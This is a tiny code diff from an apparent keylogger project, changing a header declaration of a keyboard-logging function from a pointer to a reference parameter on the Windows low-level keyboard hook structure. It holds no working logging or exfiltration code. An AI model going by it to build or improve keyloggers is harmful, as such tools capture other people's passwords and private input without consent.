@@ -4,5 +4,5 @@
 #include <Windows.h>
 
 namespace keylogger {
-	void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook);
+	void log_kbd(const KBDLLHOOKSTRUCT& kbd_hook);
 };
